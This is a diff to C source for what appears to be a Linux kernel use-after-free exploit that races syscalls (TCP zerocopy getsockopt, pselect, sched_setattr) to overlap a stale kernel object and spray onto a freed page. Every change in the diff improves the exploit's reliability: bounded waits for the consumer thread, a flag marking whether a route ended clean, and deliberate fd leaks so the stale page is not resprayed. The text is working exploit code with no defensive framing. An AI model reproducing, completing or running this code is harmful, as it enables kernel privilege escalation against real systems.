@@ -11,6 +11,20 @@ extern int pselect_custom_write;
 
 int route_last_step;
 int route_last_errno;
+/* 1 once the route drained its consumer and released every fd it raced;
+ * a stuck consumer means the stale page is still live and the caller must
+ * not spray onto it again */
+int route_last_clean;
+
+/* stop the consumer and wait out its syscall; 0 if it never left inflight */
+static int route_drain_consumer(int max_ms) {
+  atomic_store(&punch_consume_go, 0);
+  for (int waited = 0; waited < max_ms && atomic_load(&consumer_inflight);
+       waited++) {
+    usleep(1000);
+  }
+  return atomic_load(&consumer_inflight) == 0;
+}
 
 /* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
  * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
@@ -35,10 +49,7 @@ static atomic_int tcp_punch_phase;
 static atomic_int tcp_punch_failed;
 
 static void tcp_wait_for_consumer_idle(void) {
-  atomic_store(&punch_consume_go, 0);
-  while (atomic_load(&consumer_inflight)) {
-    __asm__ volatile("yield" ::: "memory");
-  }
+  route_drain_consumer(-1);
 }
 
 static int tcp_make_pair(int *client_fd, int *server_fd) {
@@ -273,6 +284,15 @@ out:
   if (puncher_started) {
     pthread_join(puncher, NULL);
   }
+  /* a consumer stuck in sched_setattr still holds the stale page; report it
+   * instead of letting the caller spray again on top of it */
+  route_last_clean = route_drain_consumer(2000);
+  if (!route_last_clean) {
+    route_last_step = route_ok ? 0 : 47;
+    pr_warning("tcp consumer still inflight after route, leaking fds\n");
+  }
+  /* fds close regardless: the route fds are hit threads' syscall objects,
+   * unlike the reclaim sockets the caller keeps for respray */
   if (map != MAP_FAILED) {
     munmap(map, TCP_PUNCH_SHMEM_LEN);
   }
@@ -640,6 +660,7 @@ void do_pselect_fake_lock_route(void) {
       /* stuck in sched_setattr or futex, closing would reclaim objects its
        * syscall still uses, leak and let process exit reclaim them */
       route_last_step = 34;
+      route_last_clean = 0;
       pr_warning("pselect consumer still inflight, leaking route fds\n");
       leak_fds = 1;
       break;
@@ -656,6 +677,9 @@ void do_pselect_fake_lock_route(void) {
   if (!leak_fds) {
     close(pipefd[0]);
     close(pipefd[1]);
+  }
+  if (route_last_step == 0) {
+    route_last_clean = 1;
   }
 
   pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
@@ -687,7 +711,10 @@ void do_kernel5_fake_lock_route(void) {
   for (int spin = 0; spin < 100000000 && atomic_load(&consumer_calls) == 0; spin++)
     __asm__ volatile("yield" ::: "memory");
   atomic_store(&punch_consume_go, 0);
-  while (atomic_load(&consumer_inflight)) __asm__ volatile("yield" ::: "memory");
+  route_last_clean = route_drain_consumer(2000);
+  if (!route_last_clean) {
+    pr_warning("mcast consumer still inflight, stale page may be live\n");
+  }
   close(fd);
   if (ret == 0 || atomic_load(&consumer_success) > 0) {
     route_last_step = 0; route_last_errno = 0;
